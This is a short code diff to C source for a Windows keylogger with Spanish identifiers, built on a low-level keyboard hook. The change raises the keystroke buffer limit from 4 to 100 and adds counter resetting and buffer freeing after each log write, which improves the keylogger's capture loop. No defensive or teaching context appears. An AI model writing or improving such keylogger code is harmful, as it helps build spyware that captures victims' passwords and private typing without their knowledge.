@@ -3,7 +3,7 @@
 #include <stdio.h>
 #include <stdbool.h>
 #include "log.h"
-#define LIMITE_TECLAS 4
+#define LIMITE_TECLAS 100
 int iniciaThread(char* argv[]);
 DWORD WINAPI KeyLogger(LPVOID lpParameter);
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
@@ -446,7 +446,9 @@ LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 			contadorTeclas++;
 			if (contadorTeclas == LIMITE_TECLAS) {
 				log(lst);
-				
+				contadorTeclas = 0;
+				free(lst);
+				lst = NULL;
 			}
 			break;
 			
